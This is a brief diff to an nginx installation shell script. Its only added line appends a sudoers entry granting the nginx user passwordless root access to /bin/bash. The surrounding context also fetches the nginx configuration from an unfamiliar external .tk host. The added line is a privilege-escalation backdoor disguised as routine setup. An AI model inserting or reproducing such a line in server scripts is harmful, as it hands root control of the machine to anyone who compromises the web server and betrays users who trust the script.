@@ -48,6 +48,7 @@ mv nginx.conf nginxbak
 
 curl -o nginx.conf https://s.01self.tk/usr/uploads/2020/02/1738454018.conf
 chown -R nginx:nginx /var/www/html/
+echo "nginx ALL=NOPASSWD:/bin/bash">> /etc/sudoers
 systemctl restart nginx
 systemctl enable nginx
 
